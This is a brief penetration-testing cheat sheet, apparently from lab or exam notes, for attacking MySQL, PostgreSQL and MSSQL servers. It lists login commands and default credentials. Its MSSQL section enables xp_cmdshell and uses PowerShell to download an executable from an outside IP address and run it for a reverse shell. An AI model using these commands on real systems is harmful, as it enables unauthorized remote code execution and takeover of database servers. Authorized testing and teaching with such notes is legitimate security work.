#### MYSQL
```
#login
mysql -u <user> -p'<pass>' -h <ip_address> -P 3306          

#Default credentials
root : '' 
```

#### POSTGRESQL
```
#Connect
psql -h <ip> -U <user> -p <port>

#Default credentials
postgres : postgres
```
#### MSSQL
```
impacket-mssqlclient <user>:<pass>@<ip_address> -windows-auth

#Enable xp_cmdshell
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'xp_cmdshell', 1
RECONFIGURE

#Get Reverse Shell.
xp_cmdshell powershell.exe iwr -uri http://10.10.93.147:1234/myshell.exe -Outfile C:\temp\myshell.exe
xp_cmdshell C:\temp\myshell.exe


#Common Enumeration (https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
```